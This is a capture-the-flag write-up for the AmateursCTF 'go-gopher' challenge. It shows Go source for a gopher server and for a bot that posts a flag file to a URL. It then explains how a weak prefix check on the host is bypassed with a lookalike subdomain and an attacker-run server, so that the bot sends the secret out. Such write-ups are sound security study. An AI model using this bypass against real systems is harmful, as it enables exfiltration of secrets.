# go-gopher

## problem

main.go
```go
package main

import (
	"fmt"
	"log"
	"net/url"
	"strings"

	"git.mills.io/prologic/go-gopher"
)

func index(w gopher.ResponseWriter, r *gopher.Request) {
	w.WriteInfo("Welcome to the flag submitter!")
	w.WriteInfo("Please submit all your flags!")
	w.WriteItem(&gopher.Item{
		Type:        gopher.DIRECTORY,
		Selector:    "/submit/user",
		Description: "Submit flags here!",
	})
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:https://ctf.amateurs.team/",
		Description: "Get me more flags lackeys!!",
	})
	w.WriteItem(&gopher.Item{
		Type:        gopher.DIRECTORY,
		Selector:    "/",
		Description: "Nice gopher proxy",
		Host:        "gopher.floodgap.com",
		Port:        70,
	})
}

func submit(w gopher.ResponseWriter, r *gopher.Request) {
	name := strings.Split(r.Selector, "/")[2]
	undecoded, err := url.QueryUnescape(name)
	if err != nil {
		w.WriteError(err.Error())
	}
	w.WriteInfo(fmt.Sprintf("Hello %s", undecoded))
	w.WriteInfo("Please send a post request containing your flag at the server down below.")
	w.WriteItem(&gopher.Item{
		Type:        gopher.FILE,
		Selector:    "URL:http://amt.rs/gophers-catcher-not-in-scope",
		Description: "Submit here! (gopher doesn't have forms D:)",
		Host:        "error.host",
		Port:        1,
	})
}

func main() {
	mux := gopher.NewServeMux()

	mux.HandleFunc("/", index)
	mux.HandleFunc("/submit/", submit)

	log.Fatal(gopher.ListenAndServe("0.0.0.0:7000", mux))
}
```

bot.go
```py
package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"git.mills.io/prologic/go-gopher"
)

var flag = []byte{}

func main() {
	content, err := os.ReadFile("flag.txt")
	if err != nil {
		log.Fatal(err)
	}
	flag = content

	http.HandleFunc("/submit", Submit)
	http.HandleFunc("/", Index)
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}

func Index(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "index.html")
}

func Submit(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	u, err := url.Parse(r.Form.Get("url"))
	if err != nil || !strings.HasPrefix(u.Host, "amt.rs") {
		w.Write([]byte("Invalid url"))
		return
	}

	w.Write([]byte(Visit(r.Form.Get("url"))))
}

func Visit(url string) string {
	fmt.Println(url)
	res, err := gopher.Get(url)
	if err != nil {
		return fmt.Sprintf("Something went wrong: %s", err.Error())
	}
	h, _ := res.Dir.ToText()
	fmt.Println(string(h))

	url, _ = strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(url)
	_, err = http.Post(url, "text/plain", bytes.NewBuffer(flag))

	if err != nil {
		return "Failed to make request"
	}

	return "Successful visit"
}
```
## solution

here, we can see that a website is created by the bot to visit a gopher server and then send a post request with the flag in it.

the main idea here, is that `strings.HasPrefix(u.Host, "amt.rs")` doesn't really work because we could have say `amt.rs.quasar.name` and totally bypass it

you had to buy a domain name for this one to get the amt.rs fourth and third level domains, which made me like the challenge slightly less. luckily i already had a domain name to use

anyways, i set up an http server using [this](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7), and just ran the main.go server on my remote server as well

it took me a while to set up, but i was able to get the flag by sending `gopher://amt.rs.quasar.name/1/submit/user` to the bot, 
and changing the main.go file on my remote server to have `quasar.name` instead of `error.host`.

edit: someone told me it's possible to use the solution for [gophers-revenge](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/gophers-revenge) for this, but doesn't that defeat the entire point of having a second challenge??????
